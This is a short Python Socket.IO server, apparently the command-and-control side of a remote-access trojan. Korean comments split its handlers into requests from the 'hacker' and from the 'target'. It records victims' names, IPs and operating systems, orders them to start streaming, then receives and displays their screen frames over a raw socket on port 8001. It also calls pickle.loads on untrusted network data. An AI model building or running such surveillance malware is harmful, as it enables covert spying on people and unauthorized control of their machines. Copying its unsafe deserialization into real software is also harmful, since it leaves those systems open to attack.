from socketio import Server, WSGIApp
import socket
import struct
import pickle
import cv2

sio = Server()
app = WSGIApp(sio)

targets = []

@sio.event
def connect(sid, environ, auth):
  print('connect ', sid)
  sio.emit('info', room=sid)

@sio.event
def disconnect(sid):
  global targets
  print('disconnect ', sid)
  for i, v in enumerate(targets):
    if v['sid'] == sid:
      targets.pop(i)
      sio.emit('del target', {'sid': sid})
      break


# 해커로부터 오는 요청
@sio.on('target list')
def getTargetList(sid):
  sio.emit('t list', {'targets': targets}, room=sid)

@sio.on('remote req')
def remoteReq(sid, data):
  sio.emit('remote start', room=data['target'])

  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

  s.bind(('',8001))
  s.listen(10)

  conn,addr=s.accept()

  data = b""
  payload_size = struct.calcsize(">L")
  while True:
    while len(data) < payload_size:
      data += conn.recv(4096)
    # receive image row data form client socket
    packed_msg_size = data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack(">L", packed_msg_size)[0]
    while len(data) < msg_size:
        data += conn.recv(4096)
    frame_data = data[:msg_size]
    data = data[msg_size:]
    # unpack image using pickle 
    frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
    frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)

    cv2.imshow('server',frame)
    cv2.waitKey(1)

@sio.on('stop remote')
def stopStream(sid, data):
  sio.emit('stop remote', room=data['target'])


# 타겟으로부터 오는 요청
@sio.on('my info')
def setTargetInfo(sid, data):
  print(data['name'])
  targets.append({
    'name': data['name'],
    'ip': data['ip'],
    'os': data['os'],
    'sid': sid
  })
  print(targets)

@sio.on('stream monitor')
def stream(sid, data):
  sio.emit('stream', {'src': data['src']}, room=data['hacker'])